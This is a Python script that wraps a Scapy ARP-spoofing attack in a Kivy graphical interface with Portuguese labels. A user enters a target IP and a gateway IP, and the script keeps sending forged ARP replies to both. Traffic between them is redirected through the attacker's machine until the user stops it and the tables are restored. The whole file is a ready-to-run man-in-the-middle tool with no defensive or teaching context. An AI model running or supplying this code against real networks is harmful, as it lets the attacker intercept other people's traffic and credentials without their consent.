import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from scapy.all import *
import threading
import os
import sys

def get_mac(ip):
    ans, unans = sr(ARP(op=ARP.who_has, pdst=ip), timeout=2, retry=10)
    for s, r in ans:
        return r[ARP].hwsrc
    return None

def spoof(target_ip, host_ip, target_mac, host_mac):
    packet = ARP(op=2, pdst=target_ip, psrc=host_ip, hwdst=target_mac)
    send(packet, verbose=False)
    packet = ARP(op=2, pdst=host_ip, psrc=target_ip, hwdst=host_mac)
    send(packet, verbose=False)

def restore(target_ip, host_ip, target_mac, host_mac):
    packet = ARP(op=2, pdst=target_ip, psrc=host_ip, hwsrc=host_mac, hwdst=target_mac)
    send(packet, count=4, verbose=False)
    packet = ARP(op=2, pdst=host_ip, psrc=target_ip, hwsrc=target_mac, hwdst=host_mac)
    send(packet, count=4, verbose=False)

class ARPSpooferApp(App):
    def build(self):
        self.spoofing = False

        layout = BoxLayout(orientation='vertical')

        self.target_ip_label = Label(text='IP do Alvo:')
        layout.add_widget(self.target_ip_label)
        self.target_ip_input = TextInput()
        layout.add_widget(self.target_ip_input)

        self.gateway_ip_label = Label(text='IP do Gateway:')
        layout.add_widget(self.gateway_ip_label)
        self.gateway_ip_input = TextInput()
        layout.add_widget(self.gateway_ip_input)

        self.start_button = Button(text='Iniciar Spoofing')
        self.start_button.bind(on_press=self.start_spoofing)
        layout.add_widget(self.start_button)

        self.stop_button = Button(text='Parar Spoofing', disabled=True)
        self.stop_button.bind(on_press=self.stop_spoofing)
        layout.add_widget(self.stop_button)

        return layout

    def start_spoofing(self, instance):
        self.target_ip = self.target_ip_input.text
        self.gateway_ip = self.gateway_ip_input.text
        
        self.target_mac = get_mac(self.target_ip)
        self.gateway_mac = get_mac(self.gateway_ip)
        
        if self.target_mac is None or self.gateway_mac is None:
            print("Não foi possível obter os endereços MAC.")
            return
        
        self.spoofing = True
        self.start_button.disabled = True
        self.stop_button.disabled = False
        
        self.spoof_thread = threading.Thread(target=self.spoof)
        self.spoof_thread.start()
    
    def spoof(self):
        while self.spoofing:
            spoof(self.target_ip, self.gateway_ip, self.target_mac, self.gateway_mac)
            spoof(self.gateway_ip, self.target_ip, self.gateway_mac, self.target_mac)
            time.sleep(2)

    def stop_spoofing(self, instance):
        self.spoofing = False
        self.spoof_thread.join()
        restore(self.target_ip, self.gateway_ip, self.target_mac, self.gateway_mac)
        restore(self.gateway_ip, self.target_ip, self.gateway_mac, self.target_mac)
        self.start_button.disabled = False
        self.stop_button.disabled = True

if __name__ == '__main__':
    if os.name == 'posix' and os.getuid() != 0:
        print("Script precisa ser executado como root (ou com permissões de administrador no Windows).")
        sys.exit(1)
    elif os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
        print("Script precisa ser executado com permissões de administrador.")
        sys.exit(1)

    ARPSpooferApp().run()
    
